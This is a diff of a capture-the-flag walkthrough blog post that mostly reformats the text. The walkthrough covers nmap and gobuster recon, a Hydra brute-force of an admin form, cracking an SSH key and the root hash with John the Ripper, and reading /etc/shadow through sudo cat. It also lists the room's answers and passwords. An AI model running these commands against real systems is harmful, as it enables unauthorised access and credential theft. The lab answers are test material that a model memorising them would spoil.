@@ -20,7 +20,7 @@ This concludes Task 1 About this box.
 Our second task is doing some reconnaissance. We will use Nmap and perform some port scanning and Gobuster to find hidden directories.
 
 Running the command:\
-nmap -sV -oN BruteItnmapScan 10.10.143.205 displayed the following information.
+**nmap -sV -oN BruteItnmapScan 10.10.143.205** displays the following information.
 
 ![](https://jarrodrizor.com/wp-content/uploads/2021/04/BruteItNmapScan.png)
 
@@ -29,13 +29,13 @@ nmap -- The command used to execute Nmap.\
 -sV -- This means Nmap will run a service/version detection scan. These scans can take a while to run, but they return information about what services are running on each open port and what version they are.\
 -oN BruteItnmapScan -- This means we want to save the output to a file named BruteItnmapScan.
 
-Question 1: How many ports are open? 2. SSH & HTTP.\
-Question 2: What version of SSH is running? OpenSSH 7.6p1\
-Question 3: What version of Apache is running? 2.4.29\
-Question 4: Which Linux distribution is running? Ubuntu
+*Question 1: How many ports are open? 2. SSH & HTTP.*\
+*Question 2: What version of SSH is running? OpenSSH 7.6p1*\
+*Question 3: What version of Apache is running? 2.4.29*\
+*Question 4: Which Linux distribution is running? Ubuntu*
 
 Running the command:\
-gobuster dir -u http://10.10.143.205 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o BruteItGobusterScan displays the hidden directory /admin.
+**gobuster dir -u http://10.10.143.205 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o BruteItGobusterScan** displays the hidden directory /admin.
 
 ![](https://jarrodrizor.com/wp-content/uploads/2021/04/BruteItGobusterScan.png)
 
@@ -46,7 +46,7 @@ dir -- (scan for directories).\
 -w -- the wordlist we are using to scan for hidden directories. In this case, I used the wordlist in Dirbuster called directory-list-2.3-small.txt.\
 -o -- saves the output to a file. In this case, we are saving to BruteItGobusterScan.
 
-Question 5. What is the hidden directory? /admin
+*Question 5. What is the hidden directory? /admin*
 
 We can navigate to the root of the website, but all we find is the Apache page.
 
@@ -74,23 +74,23 @@ Firefox and Chrome have a Network Console to pull out the Request needed for Hyr
 Also on the page, the words "Username or password invalid" will be needed so Hyrda knows that the password attempt was incorrect and to try the next password.
 
 Running the command:\
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.143.205 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid" display the following information.
+**hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.143.205 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"** display the following information.
 
 ![](https://jarrodrizor.com/wp-content/uploads/2021/04/BruteItHydraScreenshot.png)
 
 How this works:\
 hydra -- The command used to execute Hydra.\
 -l -- This is the user we want to authenticate as.\
--P -- The wordlist we want to use when brute forcing.\
+-P -- The wordlist we want to use when brute-forcing passwords.\
 10.10.143.205 -- This is the target website. (You will switch out with the IP of your target machine.)\
-http-post-form -- Lets Hydra know we are attempting to use Brute Force by\
-POSTing to a form.\
+http-post-form -- This will let Hydra know we are attempting to use Brute Force by\
+using POST methods to the form.\
 "/admin/:user=^USER^&pass=^PASS^:Username or password invalid" -- Let's break this down.\
 /admin/ is the target page.\
 user=^USER&pass=^PASS^ are the params the form is using to pass data into the form via POST. The ^USER^ and ^PASS^ are being used by the -l and -P part of the hydra command to fill in the username and password.\
 The final section is telling Hydra if you see this on the page, keep trying because this isn't the output we want.
 
-Question 1: What is the user:password of the admin panel? admin:xavier
+*Question 1: What is the user:password of the admin panel? admin:xavier*
 
 We now know the login and password. We can get into the admin page.
 
@@ -102,35 +102,36 @@ The page also has a link to download John's RSA private key that allows John to 
 
 ![](https://jarrodrizor.com/wp-content/uploads/2021/04/BruteItJohnKeyScreenshot.png)
 
-First we have to convert the RSA key into something John will understand.\
+First, we have to convert the RSA key into something John will understand.\
 Running the command:\
-/usr/share/john/ssh2john.py id_rsa > sshhash\
+**/usr/share/john/ssh2john.py id_rsa > sshhash**\
 will give John a hash that it can understand in the form of a hash.
 
 Now we can run the command:\
-john --wordlist=/usr/share/wordlists/rockyou.txt sshhash
+**john --wordlist=/usr/share/wordlists/rockyou.txt sshhash**
 
 ![](https://jarrodrizor.com/wp-content/uploads/2021/04/BruteItJohn.png)
 
 How this works:
 
-john -- The command to execute John.
-
+john -- The command to execute John.\
 --wordlist=/usr/share/wordlists/rockyou.txt sshhash -- Using the rockyou.txt, john is brute-forcing and trying to find a matching hash. Once it finds one it will display in the terminal.
 
 We now have the password.
 
-Question 2: Crack the RSA key you found. What is John's RSA Private Key passphrase? rockinroll
+*Question 2: What is John's RSA Private Key passphrase? rockinroll*
 
 SSH is now possible with the user John.
 
-Running the command: ssh -i id_rsa john@10.10.143.205\
+Running the command: **ssh -i id_rsa john@10.10.143.205**\
 will prompt for a password for the id_rsa key.\
 Entering rockinroll will get us in and we can cat the user.txt to get the flag.
 
-![](https://jarrodrizor.com/wp-content/uploads/2021/04/BruteItUserFlag.png)Question 3. user.txt. Simply cat the file!
+![](https://jarrodrizor.com/wp-content/uploads/2021/04/BruteItUserFlag.png)
 
-Question 4. web flag. This was on the admin panel with the link to the RSA key.
+*Question 3. user.txt. Simply cat the file!*
+
+*Question 4. web flag. This was on the admin panel with the link to the RSA key.*
 
 This concludes Task 3 Getting a shell
 
@@ -138,19 +139,19 @@ This concludes Task 3 Getting a shell
 
 The first thing to check is what sudo abilities John has.\
 Running the command:\
-sudo -l\
+**sudo -l**\
 shows John can use **cat** as sudo.
 
 ![](https://jarrodrizor.com/wp-content/uploads/2021/04/BruteItJohnsudocommandsScreenshot.png)\
-Let's check gtfobins and see what we can find a simple way to become root from this. Navigating to [gtfobins.github.io](https://gtfobins.github.io/gtfobins/cat/#sudo) shows us we can read from a file as root.
+Let's check [gtfobins](https://gtfobins.github.io/) and see what we can find a simple way to become root from this. Navigating to [gtfobins.github.io](https://gtfobins.github.io/gtfobins/cat/#sudo) shows us we can read from a file as root because we can use **cat** as **sudo**.
 
 ![](https://jarrodrizor.com/wp-content/uploads/2021/04/BruteItCatSudo.png)
 
 What we could do is read the /etc/shadow and get the root hash and crack that with John the Ripper.
 
 Let's run the commands:\
-LFILE=/etc/shadow\
-sudo cat "$LFILE"
+**LFILE=/etc/shadow**\
+**sudo cat "$LFILE"**
 
 and we should get the following output.
 
@@ -158,14 +159,13 @@ and we should get the following output.
 
 We now have the root hash. Let's take it back to our Attack machine and run John the Ripper on it.
 
-Similar to what we used before. We will run the command:
-
-john --wordlist=/usr/share/wordlists/rockyou.txt roothash\
-(roothash is the saved sha256 hash from the /etc/shadow file)
+Similar to what we used before. We will run the command:\
+**john --wordlist=/usr/share/wordlists/rockyou.txt roothash**\
+(roothash is the saved SHA-256 hash from the /etc/shadow file)
 
 ![](https://jarrodrizor.com/wp-content/uploads/2021/04/BruteItRootPassword.png)
 
-Question 1: What is the root's password? football
+*Question 1: What is the root's password? football*
 
 We can now **su --** as john and when prompted give the password football and we are now root and can get the root flag.
 
